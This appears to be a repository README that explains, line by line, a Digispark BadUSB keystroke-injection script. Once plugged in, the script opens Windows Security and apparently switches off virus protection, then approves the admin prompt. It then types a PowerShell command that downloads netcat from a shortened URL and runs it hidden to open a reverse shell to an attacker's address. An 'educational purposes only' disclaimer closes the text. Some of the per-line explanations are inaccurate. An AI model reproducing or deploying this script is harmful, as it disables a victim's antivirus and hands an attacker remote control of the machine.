This script uses the DigiKeyboard library to automate keystrokes and input text. Here is a breakdown of each line of code:

#include "DigiKeyboard.h"   This line includes the DigiKeyboard library.

void setup() {          This line starts the setup function.

DigiKeyboard.delay(1000);       This line pauses the script for 1 second.

DigiKeyboard.sendKeyStroke(KEY_S,MOD_GUI_LEFT);  This line sends a key press for the S key with the left GUI (Windows) key modifier.

DigiKeyboard.delay(1000);  This line pauses the script for 1 second.

DigiKeyboard.print("virus & threat protection");   This line inputs the text "virus & threat protection".

DigiKeyboard.delay(500);   This line pauses the script for 0.5 seconds.

DigiKeyboard.sendKeyStroke(KEY_ENTER);    This line sends a key press for the Enter key.

DigiKeyboard.delay(5000);    This line pauses the script for 5 seconds.

DigiKeyboard.sendKeyStroke(43);
DigiKeyboard.sendKeyStroke(43);    These four lines send key presses for the + key four times, which opens the settings menu in Windows 10.
DigiKeyboard.sendKeyStroke(43);
DigiKeyboard.sendKeyStroke(43);

DigiKeyboard.delay(700);   This line pauses the script for 0.7 seconds.

DigiKeyboard.sendKeyStroke(KEY_ENTER);  This line sends a key press for the Enter key.

DigiKeyboard.delay(700);   This line pauses the script for 0.7 seconds.

DigiKeyboard.sendKeyStroke(KEY_SPACE);   This line sends a key press for the Space key.

DigiKeyboard.delay(2000);    This line pauses the script for 2 seconds.

DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);   This line sends a key press for the Y key with the left Alt key modifier.

DigiKeyboard.delay(1000);   This line pauses the script for 1 second.

DigiKeyboard.sendKeyStroke(KEY_F4 , MOD_ALT_LEFT);  This line sends a key press for the F4 key with the left Alt key modifier, which closes the current window.

DigiKeyboard.delay(500);     This line pauses the script for 0.5 seconds.

DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);   This line sends a key press for the R key with the left GUI (Windows) key modifier, which opens the Run dialog box.

DigiKeyboard.delay(700);  This line pauses the script for 0.7 seconds.

DigiKeyboard.print("powershell curl -o netcat.exe https://bit.ly/3G3R1d1 ; powershell -w hidden netcat.exe <ip> <port> -e powershell.exe");  This line inputs a PowerShell command that downloads and executes the netcat.exe tool, which can be used for remote command execution.


DigiKeyboard.sendKeyStroke(KEY_ENTER);  This line sends a key press for the Enter key, which executes the PowerShell command.
 
void loop() {} This line starts the loop function, which is empty in this script. The loop function is not used in this script.
 


# Warning 
Everything in this repository is intended for educational purposes only. I am not responsible for any wrong behavior on your part. You are responsible for your actions using the script.
 

 



 

 






 





 






























